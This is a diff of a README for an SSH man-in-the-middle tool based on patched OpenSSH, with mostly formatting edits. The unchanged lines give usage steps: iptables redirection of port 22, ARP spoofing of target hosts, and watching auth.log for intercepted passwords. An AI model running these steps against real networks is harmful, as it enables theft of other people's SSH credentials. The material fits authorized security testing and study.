@@ -9,7 +9,7 @@ Of course, the victim's SSH client will complain that the server's key has chang
 **NOTE:** Only run the modified *sshd* in a VM or container!  Ad-hoc edits were made to the OpenSSH sources in critical regions, with no regard to their security implications.  Its not hard to imagine these edits introduce serious vulnerabilities.  Until the dependency on root privileges is removed, be sure to only run this code on throw-away VMs/containers.
 
 
-## Todo
+## To Do
 
 This is the first release of this tool.  While it is very useful as-is, there nevertheless are things to improve:
 
@@ -56,19 +56,19 @@ This is the first release of this tool.  While it is very useful as-is, there ne
 
 2.) Enable IP forwarding:
 
-    sudo echo 1 > /proc/sys/net/ipv4/ip_forward
+    sudo bash -c "echo 1 > /proc/sys/net/ipv4/ip_forward"
     sudo iptables -P FORWARD ACCEPT
 
 3.) Allow connections to *sshd* and re-route forwarded SSH connections:
 
-    iptables -A INPUT -p tcp --dport 22 -j ACCEPT
-    iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-ports 22
+    sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
+    sudo iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-ports 22
 
 4.) ARP spoof a target(s) (**Protip:** do NOT spoof all the things!  Your puny network interface won't like be able to handle an entire network's traffic all at once.  Only spoof a couple IPs at a time):
 
     arpspoof -r -t 192.168.x.1 192.168.x.5
 
-5.) Monitor the auth.log.  Intercepted passwords will appear here:
+5.) Monitor *auth.log*.  Intercepted passwords will appear here:
 
     sudo tail -f /var/log/auth.log
 
@@ -85,4 +85,3 @@ To create a new patch, use these commands:
 
     pushd openssh-7.5p1-mitm/; make clean; popd
     diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1 openssh-7.5p1-mitm/ > openssh-7.5p1-mitm.patch
-
